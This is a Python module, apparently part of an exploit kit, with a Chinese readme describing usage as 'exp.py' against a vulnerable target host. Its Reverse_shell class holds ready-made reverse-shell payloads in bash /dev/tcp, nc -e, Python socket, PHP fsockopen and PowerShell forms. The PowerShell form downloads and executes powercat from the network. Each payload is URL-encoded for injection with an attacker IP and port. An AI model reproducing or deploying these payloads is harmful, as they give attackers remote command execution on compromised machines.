#!/usr/local/env python3
#coding: utf-8



import json
import sys
import urllib

class Jsonparse(object):
    def __init__(self, file_path):
        self.file_path = file_path

    def parse(self):
        file = open(self.file_path, 'rb')
        jsonfile = json.load(file)
        # print(jsonfile['tomcat'])
        # print(jsonfile)
        return jsonfile
        
# if __name__ == '__main__':
#     obj = Reverse_shell('172.16.5.211', 3555, 5)
#     print(obj.select_type())

# def main():
#     obj = Jsonparse('./config.json')
#     obj.parse()

# if __name__ == '__main__':
#     main()



"""
Readme:
    主要实现对shell反弹方式的封装
    脚本接受参数 python exp.py config.json ip1 ip2 port reverse_type
    - ip1 ：存在漏洞的目标主机ip
    - ip2 ：监听主机的ip(指运行程序主机的ip)
    - port: 反弹shell的监听端口
    - reverse_type: 为反弹shell的方式
    - 1：表示bash反弹
    - 2：表示nc反弹
    - 3：表示python反弹
    - 4：表示php反弹
    - 5：表示windows下的powershell反弹
"""



class Reverse_shell():

    def __init__(self, ip, port, reverse_type):
        self.ip = ip
        self.port = port
        self.reverse_type = reverse_type
        self.reverse_dict = {
            "bash": "/bin/bash -i >& /dev/tcp/{}/{} 0>&1",
            "nc": "nc -e /bin/bash {} {}",
            "python": "python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"",
            "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "powershell": "powershell IEX (New-Object System.Net.Webclient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {} -p {} -e cmd"
        }

    def select_type(self):
        if self.reverse_type == 1:
            cmd = self.reverse_dict['bash'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 2:
            cmd =  self.reverse_dict['nc'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 3:
            cmd = self.reverse_dict['python'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 4:
            cmd = self.reverse_dict['php'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 5:
            cmd = self.reverse_dict['powershell'].format(self.ip, self.port)
            return urllib.quote(cmd)

